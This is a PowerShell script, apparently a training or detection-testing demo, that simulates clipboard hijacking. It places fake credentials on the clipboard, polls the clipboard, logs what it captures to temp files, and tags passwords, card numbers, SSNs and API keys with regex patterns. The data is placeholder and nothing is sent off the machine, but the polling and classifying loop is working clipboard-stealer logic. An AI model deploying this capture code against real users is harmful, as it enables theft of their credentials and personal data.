# ========================================
# Clipboard Data Collection Simulation
# ========================================

$logPath = "C:\Windows\Temp\clipboard_log.txt"
$sensitiveData = "C:\Windows\Temp\sensitive_clipboard_data.txt"

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "   Clipboard Hijacking Simulation" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "[1/3] Starting clipboard monitor..." -ForegroundColor Yellow

Add-Type -AssemblyName System.Windows.Forms

New-Item -Path "C:\Windows\Temp" -ItemType Directory -Force -ErrorAction SilentlyContinue

"=== Clipboard Monitoring Started ===" | Out-File $logPath -Force
"Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Out-File $logPath -Append
"" | Out-File $logPath -Append

"=== Sensitive Data Captured ===" | Out-File $sensitiveData -Force
"" | Out-File $sensitiveData -Append

$lastClipboard = ""
$duration = 30
$endTime = (Get-Date).AddSeconds($duration)

Write-Host "  Monitor running for $duration seconds..." -ForegroundColor Gray
Write-Host ""

Write-Host "[2/3] Simulating user activity..." -ForegroundColor Yellow
Write-Host ""

$userActions = @(
    @{Action="User copies email"; Data="john.smith@email.com"},
    @{Action="User copies password"; Data="MyP@ssw0rd123!"},
    @{Action="User copies credit card"; Data="1234-5678-9012-3456"},
    @{Action="User copies API key"; Data="sk_live_51HxyzABCDEF1234567890"},
    @{Action="User copies SSN"; Data="123-45-6789"}
)

$actionIndex = 0
$actionInterval = $duration / $userActions.Count

while ((Get-Date) -lt $endTime) {
    # 주기적으로 사용자 행동 시뮬레이션
    if ($actionIndex -lt $userActions.Count) {
        $elapsed = ((Get-Date) - $endTime.AddSeconds(-$duration)).TotalSeconds
        if ($elapsed -ge ($actionIndex * $actionInterval)) {
            $action = $userActions[$actionIndex]
            Write-Host "  [USER] $($action.Action)" -ForegroundColor Yellow
            Set-Clipboard -Value $action.Data
            Write-Host "    Copied: $($action.Data)" -ForegroundColor Gray
            $actionIndex++
        }
    }
    
    Start-Sleep -Milliseconds 500
    
    if ([System.Windows.Forms.Clipboard]::ContainsText()) {
        $current = [System.Windows.Forms.Clipboard]::GetText()
        
        if ($current -ne $lastClipboard -and $current.Length -gt 0) {
            $timestamp = Get-Date -Format "HH:mm:ss"
            $entry = "[$timestamp] Captured: $current"
            
            Write-Host "  [MALWARE] Data intercepted!" -ForegroundColor Red
            $entry | Out-File $logPath -Append
            
            # 민감정보 패턴 감지
            $patterns = @{
                'Password' = '(?i)(password|pwd|pass)[:=\s]+(\S+)|^[A-Za-z0-9!@#$%^&*]{8,}$'
                'Email' = '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
                'Credit Card' = '\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b'
                'SSN' = '\b\d{3}-\d{2}-\d{4}\b'
                'API Key' = 'sk_[a-zA-Z0-9_]+'
            }
            
            foreach ($patternName in $patterns.Keys) {
                if ($current -match $patterns[$patternName]) {
                    $alert = "[$timestamp] SENSITIVE: $patternName - $current"
                    Write-Host "    Type: $patternName" -ForegroundColor Magenta
                    $alert | Out-File $sensitiveData -Append
                }
            }
            
            $lastClipboard = $current
            Write-Host ""
        }
    }
}

"" | Out-File $logPath -Append
"=== Monitoring Ended ===" | Out-File $logPath -Append

Write-Host ""
Write-Host "[3/3] Analysis results..." -ForegroundColor Yellow
Write-Host ""

Write-Host "Clipboard Activity Log:" -ForegroundColor Cyan
Write-Host "======================================" -ForegroundColor Gray
Get-Content $logPath
Write-Host "======================================" -ForegroundColor Gray
Write-Host ""

Write-Host "Sensitive Data Captured:" -ForegroundColor Red
Write-Host "======================================" -ForegroundColor Gray
Get-Content $sensitiveData
Write-Host "======================================" -ForegroundColor Gray
Write-Host ""

$logContent = Get-Content $logPath -Raw
$capturedCount = ([regex]::Matches($logContent, "\[.*?\] Captured:")).Count

Write-Host "========================================" -ForegroundColor Green
Write-Host "   Attack Complete" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "Statistics:" -ForegroundColor Yellow
Write-Host "  Captures: $capturedCount items" -ForegroundColor White
Write-Host "  Types: Email, Password, Credit Card, API Key, SSN" -ForegroundColor Red
Write-Host ""
Write-Host "Files created:" -ForegroundColor Cyan
Write-Host "  $logPath" -ForegroundColor White
Write-Host "  $sensitiveData" -ForegroundColor White
Write-Host ""